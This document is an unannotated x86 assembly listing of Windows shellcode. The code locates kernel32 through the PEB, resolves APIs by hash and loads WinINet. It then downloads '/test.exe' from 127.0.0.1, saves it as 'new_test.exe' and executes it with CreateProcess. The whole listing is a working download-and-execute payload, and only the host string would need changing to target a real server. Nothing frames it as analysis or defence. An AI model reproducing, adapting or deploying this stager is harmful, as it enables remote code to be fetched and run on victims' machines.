start:
       mov ebp, esp
       sub esp, 0x2050
   find_kernel32:                       
       xor ecx,ecx                     
       mov esi,fs:[ecx+30h]            
       mov esi,[esi+0Ch]               
       mov esi,[esi+1Ch]               
   next_module:                         
       mov ebx, [esi+8h]               
       mov edi, [esi+20h]              
       mov esi, [esi]                  
       cmp [edi+12*2], cx              
       jne next_module                 
   find_function_shorten:               
       jmp find_function_shorten_bnc   
   find_function_ret:                   
       pop esi                         
       mov [ebp+0x04], esi             
       jmp resolve_symbols_kernel32    
   find_function_shorten_bnc:           
       call find_function_ret          
   find_function:                       
       pushad                          
       mov eax, [ebx+0x3c]             
       mov edi, [ebx+eax+0x78]         
       add edi, ebx                    
       mov ecx, [edi+0x18]             
       mov eax, [edi+0x20]             
       add eax, ebx                    
       mov [ebp-4], eax                
   find_function_loop:                  
       jecxz find_function_finished    
       dec ecx                         
       mov eax, [ebp-4]                
       mov esi, [eax+ecx*4]            
       add esi, ebx                    
   compute_hash:                        
       xor eax, eax                    
       cdq                             
       cld                             
   compute_hash_again:                  
       lodsb                           
       test al, al                     
       jz compute_hash_finished        
       ror edx, 0x0d                   
       add edx, eax                    
       jmp compute_hash_again          
   compute_hash_finished:               
   find_function_compare:               
       cmp edx, [esp+0x24]             
       jnz find_function_loop          
       mov edx, [edi+0x24]             
       add edx, ebx                    
       mov cx, [edx+2*ecx]             
       mov edx, [edi+0x1c]             
       add edx, ebx                    
       mov eax, [edx+4*ecx]            
       add eax, ebx                    
       mov [esp+0x1c], eax             
   find_function_finished:              
       popad                           
       ret                             
   resolve_symbols_kernel32:            
       push 0x78b5b983
       call dword ptr [ebp+0x04]       
       mov [ebp+0x10], eax             
       push 0xec0e4e8e
       call dword ptr [ebp+0x04]       
       mov [ebp+0x14], eax             
       push 0xe454dfed
       call dword ptr [ebp+0x04]
       mov [ebp+0x20], eax
       push 0xefe297c0
       call dword ptr [ebp+0x04]
       mov [ebp+0x24], eax
       push 0x16b3fe72
       call dword ptr [ebp+0x04]
       mov [ebp+0x28], eax
       push 0x3249baa7
       call dword ptr [ebp+0x04]
       mov [ebp+0x2c], eax
       push 0xffd97fb
       call dword ptr [ebp+0x04]
       mov [ebp+0x30], eax
       push 0xe80a791f
       call dword ptr [ebp+0x04]
       mov [ebp+0x34], eax
       push 0x4776654a
       call dword ptr [ebp+0x04]
       mov [ebp+0x38], eax
       push 0x7c0017a5
       call dword ptr [ebp+0x04]
       mov [ebp+0x3c], eax
       push 0x0006c
       push 0x6c642e6c
       push 0x6c64746e
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x3e192526
       call dword ptr [ebp+0x04]
       mov [ebp+0x40], eax
       push 0x77c93c6
       call dword ptr [ebp+0x04]
       mov [ebp+0x44], eax
       push 0x06c6c64
       push 0x2e74656e
       push 0x696e6977
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x1e4be80e
       call dword ptr [ebp+0x04]
       mov [ebp+0x48], eax
       push 0x57e84429
       call dword ptr [ebp+0x04]
       mov [ebp+0x4c], eax
       push 0x2de6be9d
       call dword ptr [ebp+0x04]
       mov [ebp+0x50], eax
       push 0xf7de769f
       call dword ptr [ebp+0x04]
       mov [ebp+0x54], eax
       push 0x5fe34b8b
       call dword ptr [ebp+0x04]
       mov [ebp+0x58], eax
       push 0x006c6c
       push 0x642e3233
       push 0x5f327377
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x3bfcedcb
       call dword ptr [ebp+0x04]
       mov [ebp+0x5c], eax
       push 0xadf509d9
       call dword ptr [ebp+0x04]
       mov [ebp+0x60], eax
       push 0xb32dba0c
       call dword ptr [ebp+0x04]
       mov [ebp+0x64], eax
       mov esi, ebp
       jmp main
   HTTPConnect:
       push ebp
       mov ebp, esp
       sub esp, 0x8
       mov eax, [ebp+0x8]
       push 0x0
       push 0x0
       push 0x0
       push 0x1
       push eax
       call dword ptr [esi+0x4c]
       mov dword ptr [ebp-0x4], eax
       mov eax, [ebp-0x4]
       mov ebx, [ebp+0xc]
       push 0x0
       push 0x0
       push 0x3
       push 0x0
       push 0x0
       push 0x50
       push ebx
       push eax
       call dword ptr [esi+0x48]
       mov dword ptr [ebp-0x8], eax
       mov eax, [ebp-0x8]
       add esp, 0x8
       mov esp, ebp
       pop ebp
       ret
   HTTPGetRequest:
       push ebp
       mov ebp, esp
       sub esp, 0xc
       push 0x0544547
       mov [ebp-0x4], esp
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       mov ecx, [ebp+0xc]
       push 0x0
       push 0x80000000
       push 0x0
       push 0x0
       push 0x0
       push ecx
       push ebx
       push eax
       call dword ptr [esi+0x54]
       mov dword ptr [ebp-0x8], eax
       mov eax, [ebp+0x10]
       push eax
       call strlen
       add esp, 0x4
       mov dword ptr [ebp-0xc], eax
       mov eax, [ebp-0x8]
       mov ebx, [ebp+0x10]
       mov ecx, [ebp-0xc]
       push 0x0
       push 0x0
       push ecx
       push ebx
       push eax
       call dword ptr [esi+0x50]
       mov eax, [ebp-0x8]
       add esp, 0xc
       mov esp, ebp
       pop ebp
       ret
   HTTPDownloadFile:
       push ebp
       mov ebp, esp
       sub esp, 0x24
       push 0x00072
       push 0x65726f6c
       push 0x70784520
       push 0x74656e72
       push 0x65746e49
       mov [ebp-0x4], esp
       push 0x006d61
       push 0x65727473
       push 0x2d746574
       push 0x636f2f6e
       push 0x6f697461
       push 0x63696c70
       push 0x7061203a
       push 0x65707954
       push 0x2d746e65
       push 0x746e6f43
       mov [ebp-0x8], esp
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x2
       call dword ptr [esi+0x44]
       mov dword ptr [ebp-0xc], eax
       mov eax, [ebp-0xc]
       mov ebx, [ebp+0x14]
       push ebx
       push 0x8
       push eax
       call dword ptr [esi+0x40]
       mov dword ptr [ebp-0x10], eax
       mov eax, [ebp-0x4]
       mov ebx, [ebp+0x8]
       push ebx
       push eax
       call HTTPConnect
       add esp, 0x8
       mov dword ptr [ebp-0x14], eax
       mov eax, [ebp-0x14]
       mov ebx, [ebp+0xc]
       mov ecx, [ebp-0x8]
       push ecx
       push ebx
       push eax
       call HTTPGetRequest
       add esp, 0xc
       mov dword ptr [ebp-0x18], eax
       mov dword ptr [ebp-0x1c], 0x0
       lea eax, dword ptr [ebp-0x1c]
       mov dword ptr [ebp-0x20], eax
       mov eax, [ebp-0x18]
       mov ebx, [ebp-0x10]
       mov ecx, [ebp+0x14]
       sub ecx, 1
       mov edx, [ebp-0x20]
       push edx
       push ecx
       push ebx
       push eax
       call dword ptr [esi+0x58]
       mov eax, [ebp+0x10]
       push 0x80
       push 0x1
       push 0x0
       push 0x0
       push 0x40000000
       push eax
       call dword ptr [esi+0x3c]
       mov dword ptr [ebp-0x24], eax
       mov eax, [ebp-0x24]
       mov ebx, [ebp-0x10]
       mov ecx, [ebp+0x14]
       push 0x0
       push 0x0
       push ecx
       push ebx
       push eax
       call dword ptr [esi+0x34]
       mov eax, [ebp-0x24]
       add esp, 0x24
       mov esp, ebp
       pop ebp
       ret
   strlen:
       push ebp
       mov ebp, esp
       sub esp, 0x8
       mov dword ptr [ebp-0x4], 0x0
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x8], eax
   while_stmt1:
       mov eax, [ebp-0x8]
       cmp eax, 0x0
       jle while_stmt1_end
       mov eax, [ebp-0x4]
       add eax, 1
       mov dword ptr [ebp-0x4], eax
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x8], eax
       jmp while_stmt1
   while_stmt1_end:
       mov eax, [ebp-0x4]
       add esp, 0x8
       mov esp, ebp
       pop ebp
       ret
   strcmp:
       push ebp
       mov ebp, esp
       sub esp, 0x14
       mov eax, [ebp+0x8]
       push eax
       call strlen
       add esp, 0x4
       mov dword ptr [ebp-0x4], eax
       mov eax, [ebp+0xc]
       push eax
       call strlen
       add esp, 0x4
       mov dword ptr [ebp-0x8], eax
       mov dword ptr [ebp-0xc], 0x0
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0x8]
       cmp eax, ebx
       je if_stmt1
       mov eax, 0
       add esp, 0xc
       mov esp, ebp
       pop ebp
       ret
   if_stmt1:
   while_stmt2:
       mov eax, [ebp-0xc]
       mov ebx, [ebp-0x4]
       cmp eax, ebx
       jg while_stmt2_end
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0xc]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x10], eax
       mov eax, [ebp+0xc]
       mov ebx, [ebp-0xc]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x14], eax
       mov eax, [ebp-0x10]
       mov ebx, [ebp-0x14]
       cmp eax, ebx
       je if_stmt2
       mov eax, 0
       add esp, 0x14
       mov esp, ebp
       pop ebp
       ret
   if_stmt2:
       mov eax, [ebp-0xc]
       add eax, 1
       mov dword ptr [ebp-0xc], eax
       jmp while_stmt2
   while_stmt2_end:
       mov eax, 1
       add esp, 0xc
       mov esp, ebp
       pop ebp
       ret
   CreateProcess:
       push ebp
       mov ebp, esp
       sub esp, 0x10
       sub esp, 0x44
       mov [ebp-0x4], esp
       mov dword ptr [ebp-0x8], 0x0
   while_stmt7:
       mov eax, [ebp-0x8]
       cmp eax, 0x11
       jge while_stmt7_end
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0x8]
       sal ebx, 2
       add eax, ebx
       mov dword ptr [eax], 0x0
       mov eax, [ebp-0x8]
       add eax, 1
       mov dword ptr [ebp-0x8], eax
       jmp while_stmt7
   while_stmt7_end:
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       mov [ebp-0xc], esp
       mov eax, [ebp-0x4]
       mov dword ptr [eax], 0x44
       mov dword ptr [ebp-0x10], 0x0
       mov eax, [ebp+0x8]
       cmp eax, 0x0
       push eax
       call strlen
       add esp, 0x4
       cmp eax, 0x0
       je if_stmt4
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       mov ecx, [ebp-0xc]
       push ecx
       push ebx
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push eax
       call dword ptr [esi+0x28]
       mov dword ptr [ebp-0x10], eax
      jmp if_stmt4_else
   if_stmt4:
       mov eax, [ebp+0xc]
       mov ebx, [ebp-0x4]
       mov ecx, [ebp-0xc]
       push ecx
       push ebx
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push eax
       push 0x0
       call dword ptr [esi+0x28]
       mov dword ptr [ebp-0x10], eax
   if_stmt4_else:
       mov eax, [ebp-0x10]
       add esp, 0x10
       mov esp, ebp
       pop ebp
       ret
   main:
       push ebp
       mov ebp, esp
       sub esp, 0x1c
       push 0x00031
       push 0x2e302e30
       push 0x2e373231
       mov [ebp-0x4], esp
       push 0x00065
       push 0x78652e74
       push 0x7365742f
       mov [ebp-0x8], esp
       push 0x0000
       push 0x6578652e
       push 0x74736574
       push 0x5f77656e
       mov [ebp-0xc], esp
       push 0x00072
       push 0x65726f6c
       push 0x70784520
       push 0x74656e72
       push 0x65746e49
       mov [ebp-0x10], esp
       push 0x0006e
       push 0x5c6c6d74
       push 0x682f7478
       push 0x6574203a
       push 0x65707954
       push 0x2d746e65
       push 0x746e6f43
       mov [ebp-0x14], esp
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0x8]
       mov ecx, [ebp-0xc]
       push 0x186a0
       push ecx
       push ebx
       push eax
       call HTTPDownloadFile
       add esp, 0x10
       mov dword ptr [ebp-0x18], eax
       mov eax, [ebp-0x18]
       push eax
       call dword ptr [esi+0x30]
       push 0x0000
       mov [ebp-0x1c], esp
       mov eax, [ebp-0xc]
       mov ebx, [ebp-0x1c]
       push ebx
       push eax
       call CreateProcess
       add esp, 0x8
       mov eax, 1
       add esp, 0x1c
       mov esp, ebp
       pop ebp
       ret